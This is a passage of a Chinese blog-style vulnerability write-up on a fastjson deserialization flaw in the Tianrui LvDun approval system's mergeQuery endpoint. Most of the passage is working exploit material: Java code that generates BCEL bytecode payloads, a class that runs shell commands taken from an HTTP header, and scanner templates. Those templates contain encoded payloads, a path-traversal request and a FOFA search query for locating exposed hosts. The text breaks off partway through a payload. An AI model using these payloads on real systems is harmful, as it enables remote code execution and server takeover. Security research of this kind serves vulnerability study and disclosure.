class="string">body</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;0okm&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>在pom文件中可以看到使用了fastjson，版本是古老的1.2.7</p>
+<p><img src="image-20250923001536158.png" alt="image-20250923001536158"></p>
+<p>所以直接找一下哪些地方用到了fastjson反序列化的操作</p>
+<p>用`(?:JSON|Fastjson).(?:parse|parseObject|parseArray)\s*(``找了一下</p>
+<p>有很多处，保存下来，排除掉固定class的，最后只剩下两个文件，</p>
+<p><img src="image-20250929102124796.png" alt="image-20250929102124796"></p>
+<p><img src="image-20250929102539164.png" alt="image-20250929102539164"></p>
+<p>第一个是个信的推送接口相关的功能，但是代码中没有找到调用的地方，直接忽略</p>
+<p>第二个是则可以利用，从代码中可以看到请求request是一个list，通过遍历list成员，判断type，之后对成员进行反序列化，所以只需要找到哪些类型会执行JSON.parseObject即可</p>
+<p><img src="image-20250929111754007.png" alt="image-20250929111754007">简单查找后发现</p>
+<p>trusteeMsg、auditor、intervalTime、auditorAndCategory、auditorVerifyCodeFlow、approvalConfig</p>
+<p>而其中只有trusteeMsg、intervalTime是没有指定class的，也就是说只有这两个地方有漏洞</p>
+<h2 id="bcel"><a href="#bcel" class="headerlink" title="bcel"></a>bcel</h2><p>trusteeMsg和intervalTime的payload是比较好构造，由于我没有服务器，不方便构造jndi那种远程请求的利用方式，所以我用的bcel加载字节码的方式</p>
+<p>先将需要执行的类进行编译，javac tmp.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tmp.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tmp</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        File targetFile = <span class="keyword">new</span> File(<span class="string">&quot;webapps/ROOT/AA00123.jsp&quot;</span>);</span><br><span class="line">        <span class="comment">// 写入内容</span></span><br><span class="line">        <span class="keyword">try</span> (FileWriter writer = <span class="keyword">new</span> FileWriter(targetFile)) &#123;</span><br><span class="line">            writer.write(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Successfully created file: &quot;</span> + targetFile.getAbsolutePath());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>随后使用下面的代码生成字节码以及payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BcelTest.java</span></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BcelTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(tmp.class);</span><br><span class="line">        String code = Utility.encode(cls.getBytes(),<span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        <span class="comment">// 加载类并实例化</span></span><br><span class="line">        <span class="keyword">new</span> ClassLoader().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">        String s = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="string">&quot;\&quot;,\&quot;driverClassloader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">      <span class="comment">//JSON.parseObject(s);   //本地测试</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20250929162305314.png" alt="image-20250929162305314"></p>
+<p><img src="image-20250929162341466.png" alt="image-20250929162341466"></p>
+<h2 id="SpringEcho"><a href="#SpringEcho" class="headerlink" title="SpringEcho"></a>SpringEcho</h2><p>不过这样好像还是不太方便，所以想试着使用直接spring echo的方式直接回显，代码来自<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/2201_75353421/article/details/132077531">https://blog.csdn.net/2201_75353421/article/details/132077531<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringEcho</span> </span>&#123;</span><br><span class="line">    <span class="comment">//静态代码块在类加载的时候就会去执行</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//首先获取当前的HttpServletRequest和HttpServletResponse对象。</span></span><br><span class="line">            Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            Method m = c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            Object o = m.invoke(<span class="keyword">null</span>);</span><br><span class="line">            c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">            Method m1 = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            Object resp = m.invoke(o);</span><br><span class="line">            Object req = m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">            <span class="comment">//通过反射获取HttpServletRequest的&quot;getHeader&quot;方法，用于获取HTTP请求头&quot;cmd&quot;的值，通过变量&quot;cmd&quot;执行系统命令。</span></span><br><span class="line">            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">            getHeader.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            getWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object writer = getWriter.invoke(resp);</span><br><span class="line">            String cmd = (String) getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            String[] commands = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">            <span class="comment">//这里对操作系统做了判断，windows和linux的采用cmd和/bin/bash来命令执行</span></span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            commands[<span class="number">2</span>] = cmd;</span><br><span class="line">            <span class="comment">//使用反射获取&quot;writer&quot;对象的方法，然后执行命令并输出结果</span></span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20250929173013505.png" alt="image-20250929173013505"></p>
+<p>直接写入文件的yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">TianRui-LvDun-mergeQuery-deserialization</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">天锐绿盾审批系统-/rest/ext/mergeQuery-存在fastjson反序列化漏洞</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">This_is_Y</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">天锐绿盾审批系统-mergeQuery接口存在fastjson反序列化漏洞，攻击者可利用该漏洞执行任意代码，获取服务器权限。requestType可以是trusteeMsg和intervalTime,该payload为写入hello文件</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">upload</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;TIPPAY-绿盾审批系统&quot;</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|-</span></span><br><span class="line">        <span class="string">POST</span> <span class="string">/trwfe/user/logon.do/../../rest/ext/mergeQuery</span> <span class="string">HTTP/1.1</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(MSIE</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Windows</span> <span class="string">NT</span> <span class="number">3.14</span><span class="string">;</span> <span class="string">Trident/5.0)</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/json</span></span><br><span class="line">        <span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line">        <span class="attr">Content-Length:</span> <span class="number">2163</span></span><br><span class="line"></span><br><span class="line">        [&#123;<span class="string">&quot;requestType&quot;</span><span class="string">:&quot;trusteeMsg&quot;</span>,<span class="string">&quot;requestBody&quot;</span><span class="string">:</span>&#123;<span class="string">&quot;@type&quot;</span><span class="string">:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<span class="string">&quot;driverClassName&quot;</span><span class="string">:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$dfS$TW$U$fe$$$c9$e6$86u$f9a$Q$F$ad$zm$fd$R$TB$Qm$ad$80$da$a0$a6$fe$I$846$M$j$a6$d3$87$cd$e6$K$8bKvg$b3$v$fa$e2L$ed$l$c3$b3$7d$I32S$df$7c$f0O$f2A$fa$ddM$Q$u$dd$99$3dg$cf9$df9$f7$3b$e7$dc$fd$f0$e9$ed$3f$An$e2g$Tg$91$93$c8$a71i$a2$P$F$89$v$T$G$8aiLk$7d$bd$l3$b8$nq$d3$84$89$5c$g$dfi$fd$bdF$de$d2_$3f$98$b8$8dY$N$9c$93$987$91$c1$j$89$bb$S$f7$q$7e$UH$cd$bbM7$ba$x$90$c8$5e$5b$VH$de$f7$hJ$60$a8$e26$d5R$7b$ab$ae$c2$V$bb$ee$d1$93$a9$f8$8e$ed$ad$da$a1$ab$ed$9e3$Zm$b8$z$B$a3$Sm$Fs$C$e9y$c7$ebUKm$87n$a4B$813$95M$fb$P$bb$e8$fa$c5$b2$eb$a9_c$_$a1fd$87$eb$w$d2$3e$81$c1c$YF$Hj$91$ed$3c_$b4$83$f8$iv$ce$8e$c9$9d$b4$99Y$f3$db$a1$a3$ba$99i$k$3c$a5$93$z$9c$c3$98$80u$b4$90$c0$d8$b6$aa$dbA$d0$w$feR$ad$ae$UK$a5$e9$e9$eb37$a66$5b$81$86$97$d8$d4In$3a$b2$c0S6$94$e7$f9$db$7e$e85$y$dcGI$e2$81$85$87$u$L$9c$8bs$3c$bb$b9$5e$acE$a1$db$5c_h$bb$5eC$b7z$a1$d6v$i$d5j$3dk$7b$de$cb$J$tTv$a4$g$T$cfXzv$c2$c2Oxd$e11$9eXx$8a$t$S$V$L$8b$uYX$d2$b4G$Ok$ael$84$fe$b6$ee$daB$V$cb$H$nR$7c$5c$7d$f8$c2QA$e4$faM$$$8b$7d$L$M$l$a6U$eb$9b$ca$89$EF$b3$95$ff$f2$9b$d3$7b$3d$9d$3d$3ec$ed3$e2$j$j$xS$7b$d9$8a$d4$W$eb$fbm$5d$ecs$ce2$LE$y$a7$ec$z$ae$t$c5$99$aafC$a0$f0$7f$a7$9dp$f5$G$c4$c4$n$ae$bcTo$f9$5e$3bR$cbv$b4$c1$eb$91$3d$89$d77$v$f2$bb$dfG$Gp$84$83$80$M$b4$e5q$U$86$e3$f9$zv1$607$g$b5v$Q$84$dc$80$o$b7$b1$a3$dc$3eO$95$8d$e3k$8c$f2$87$d2O$l$84$be7$94$e3$b4$8a$d4$82$da$c8$edB$bc$89$c3$e7$vS$5d$t$$PZ$bd$ef$_p$91$3a$8d$_$P$92$c5$g$SD$C$7f$ed$a1o$z$93$d8E$f2$e9$k$8c5$96JU$c4b$3e$p$3bH$ff$8d$fe$3d$98k$bb8$95$b1$3a$Y$c8u0H$d5$c1P$H$c3$f9$f7$uO$be$c7H$be$83$d3$3b$98$5b$9a$yt0$b2$83$99$ae$9d_$w$y$W$de$cd$s$89$baH$d4h$d7$9b$995$s$c7$8d$Y$t$b5g$3c$f9n$H$c9$ca$h$S$b9$c7K$5b$e6$af$3e$8a$5bX$ed$e9$dfHO$c1$85G$7b$V$bf$c7$b6$89W$f8$TgH$5e$b7$9a$a3$NH$ca$7ef$98l$f9$U$f3$y$a2$fb$89$b6$88$j$m$da$c2k$M$c6$e38$cb$R$8d$e09$be$c2$E$c7$60$e2$Fg$fb$N$fd$df$f2$7d$Es$9f$U$S$S$97$q$$K$5c$81$a0H$97$v$k$f0$dd$c70$8c$c3$d8A$dcL$ec$eb$ad0$A$yH$5c$fd$c8J$C$d9x$Z$d7$fe$F$c3$p$T$f3$S$F$A$A&quot;</span>,<span class="string">&quot;driverClassloader&quot;</span><span class="string">:</span>&#123;<span class="string">&quot;@type&quot;</span><span class="string">:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;&#125;&#125;]</span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">400</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;Bad request&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/AA00123.jsp&#x27;</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;helloworld&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行命令的yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">TianRui-LvDun-mergeQuery-deserialization</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">天锐绿盾审批系统-/rest/ext/mergeQuery-存在fastjson反序列化漏洞</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">This_is_Y</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">天锐绿盾审批系统-mergeQuery接口存在fastjson反序列化漏洞，攻击者可利用该漏洞执行任意代码，获取服务器权限。requestType可以是trusteeMsg和intervalTime,该payload为执行命令</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">upload</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;TIPPAY-绿盾审批系统&quot;</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|-</span></span><br><span class="line">        <span class="string">POST</span> <span class="string">/trwfe/user/logon.do/../../rest/ext/mergeQuery</span> <span class="string">HTTP/1.1</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(MSIE</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Windows</span> <span class="string">NT</span> <span class="number">3.14</span><span class="string">;</span> <span class="string">Trident/5.0)</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/json</span></span><br><span class="line">        <span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line">        <span class="attr">cmd:</span> <span class="string">echo</span> <span class="string">hello9527</span></span><br><span class="line">        <span class="attr">Content-Length:</span> <span class="number">2163</span></span><br><span class="line"></span><br><span class="line">        [&#123;<span class="string">&quot;requestType&quot;</span><span class="string">:&quot;trusteeMsg&quot;</span>,<span class="string">&quot;requestBody&quot;</span><span class="string">:</span>&#123;<span class="string">&quot;@type&quot;</span><span class="string">:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<span class="string">&quot;driverClassName&quot;</span><span class="string">:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5d$f2$98a$YD$D$I$f1Q$a5$be$CJR$fb$b0$Kh$c1$a8$c5$g$d0$g$95$oj$3b$M$X22$99$893$T$c0$be$df$P$fb$7eY$ad$7d$7e$5d$b8v$T$f9$daO$bf$ae$bbh7$ddv$d5U$bb$e9$7fP$7bnf$o$89$60$db$y$ce$3d$f7$dc$dfy$9f$7b3$3f$fd$fd$fdM$A$P$e2$h$F$f5$YR0$8c$c3$82$i$91$f1$b8$82$a3$c8$ca8$s$e1$b8$C$J$t$q$8c$ux$C$a32N$ca$Y$93qJ$c6i$Z$bb$c5$d9$Z$ZO$ca$d8$p$e1$v$81$d0d$f4$cb$YW$a0cBA3$b8$8cI$b1N$c9$c8$c90d$9c$V$ce$a6e$98$S$f2$K$y$d8$82$U$U$9c$83$a3$60$3d$5c$Z$9eX$8b$82$cc$c8$98$951$t$e1$bc$84$a7$Z$a2$7d$86ex$7b$YB$89$ce$T$M$e1$b4$3d$c1$Z$9a2$86$c5$87$8b$f9q$ee$i$d3$c6M$92$c42$b6$ae$99$t4$c7$Q$fb$40$Y$f6r$86$cb$a0f$b2$F$c7$b0$a6$f6$eb9$bb$97A$ee$d3$cd$c0$u$d3$ZVd$cej3Z$ca$d4$ac$a9T$da$d4$5c$97$m$y$cf$b0$aaJ$ee$f0I$93$eb$5ej$88$7b9$7bB$Al$e1r$Bpx$fc$y$9d$d3A$5d$7e$3b$f9u$b8$5b$a0$90$j$7e$8e$a1$7e$8a$7b$p$8e$e1q$c7$e7$H$b96$n$f8$e8l$m$M$e9$f9$89ZkYO$84$xB$d5$ed$7c$5e$b3$s$u$89$e6$b1$a5$A$8dYO$d3$a7$87$b4B9c$ea$9c$84g$a8o$d4$Y$Ji$aa$n$83$92$b5$8b$8e$ce$P$Y$a2$mM$L$85H$Kk$w$b6$a1$5b$c2$b3$w$9e$c3$f3$w$5e$c0$8b$M$7d$b63$95t$cb$b8IG$cb$f3Y$db$99N$ce$f2$f1$a4n$5b$k$9f$f3$92$94U$91$bb$5e$f2$a8$bf$a6$7d$f1$a0mRZ$S$5eR$f12$5eah$a1T$D$c4$80G$e1$8e$X$3dNi4$ddQl$V$af$e25$86$e5w$96$92$f2P$f1$3a$de$60$e8$ff$bf$f1d$b93c$$$e9$b4$a1$i$8b$5b$b0$z$97$8a$a0$yD$c6$b0V8$9eK$ba$be$ee$82$N$l$ac$e2M$R$dd$a6ZP$ce$f3$K$c9A$o$b5$kk$b2$f0$3b$a4$e2$z$5c$60$90l7iQ$e8$S$deV$f1$O$deU$f1$k$de$a7$c6$8f$i$iV$f1$B$3e$a4$b1I$d1$qJ$a9q$c3J$b99$dav$eb$w$3e$c2$c7$q$T$89$7b$a6EsZ6$5e$f4$M3$95$d55$cb$S$c5$feD$c5$a7$b8$a8$e23$5c$92pY$c5$e7$b8$oZ$fa$FY85$a0$e2K$7c$a5$e2k$e1$w2i$W$85$e1$88n$da$a2$G$cd$L$91$ee$9f$d3y$c13lK$cc$ca$ed$f1$60h$bf$db$f8$d7$e4y$y$e7$d0$3c$d3$m$eaE$c7$e1$96W$d9$b7$q$3a3w$a2h$5e$5b$a9$f6$c1$c0$94$db$9f$b1$fd$cb$Q$af$81W$j$J$9d$r$P$e82$99$c4$94$r$d4$a1$c4$e2$db$b1$c8b$af$7f$B$xY$f4$_$a13$b6H$a7$f3$df$9e$81$a8a$cd$d8$d3T$cf$5d$89$c5$8f$c1$d8bQ$e7RO$c6$K$8ai$l$d7M$cd$e1$T$95$d8$g$5d$ee$N$e8$3aw$5d$c3$7f$c9$S$t$c5$f3W$3d$60$e7$5d$8f$e7$fd$d9$3e$e2$d8$F$eext$db7$ffG$jn$3f$i$N$9e$7d$bc$40JiM$8cCm$b7$aa$9f$l$cb$d3$M$8b$K$bc$ba$dap$3a$a79Y1$f4$96$ce$7b$3bO$SP$b4$d5$efD$f3$e2N$f6V$86$b7$y$3aZ$b4$3c$p_$b9$87$95Mk$8dZ$m$s$c50$9f$e3t5$S$89$r$9e$bfj$N$w$81$a8V$ad$ab$40$c8$b0$8c$5c$j$b4$KE$8f4$b9FUk$ab$b83$ecT$d5$B$a9$b7$t$96$3c$Q$d5W$8b$$$df$c7M$p$ef$bf$db$5b$ee$5e$eb$ea$5b$w$92$b0h$de$d1$81$ad$f47$u$7eu$60$e2$e1$r$9a$a4$5d$8aVFk$a4$eb$3a$d8$b5$f2q$8ah$b4$y$M$e3$3e$a2$aa$P$c0v$dcO$ab$8c$H$w$cau$97$c8d$D$c0$ce$cc$a3$ae$84P$y$5cB$e4PW$y$g$ba$B$a9$E9$b3$95$RW_$822$U$A$g$7c$80Z$Bt$c5$g$Dvx$eb$b6$A$db$T$ee$be$cdF$C$bde$a4$Xk$f2$a1$cb$7b$a2$81t$85$90$c6$c2$q$j$N$c5$9a$b3$e2H$8aK$UDK$3c$ea$d3x$b8bI$8eK$f1$IA$eb$J$daJP$e5G4$f7$d4Go$QUb$x$e7$d1VB$7b$y$5e$c2$aa$cb$88$c5$V$81$89$x$e1$d8$ea$ecU4$89$ed$9a$f2v$z$d1H$bc$3e$h$97K$b8$t$b6$ae$das$5c$f6$8d$ff$80$f5$a3$f3$e8$88$x$r$dc$5b$c2$86$eb$d8$Y$dbT$c2$e6$S$b6$I$a7$p$bef$o$c8$q$$$H$e1$F$f2$ceE$f2$ab$I$l$ba$s$ea$cfF$d9$vt$nT$ee$8e$85$d5D$eb$a93$K$da$a8$D$j$c4u$a3$R$3b$b1$Mi4$d1$t$d5r$8c$o$G$9b$be$83$$$a0$85$5e$f9V$5c$c4J$7cG$e8y$b4$e3$sV$e1g$b2$f1$x$d6$e07$dc$83$df$b1$O$7f$90$95$bf$b0$81ub$p$h$c0$s6$8a$Ey$dc$ccN$93W1$F$F$f2$a3$b2$n$faz$7b$88vml$_v$e0a$8a$ac$83$ed$q$bf$bbhn$d2l$rzH$W$c20k$40$_$c9$c2$Y$a5$d0$fb$88$8bP$y$7fb7$9dF$v$a2_$b0$878$89$e2$v$e1$R$3a$95$v$aao$d1$8f$B$ca$e9$s$ae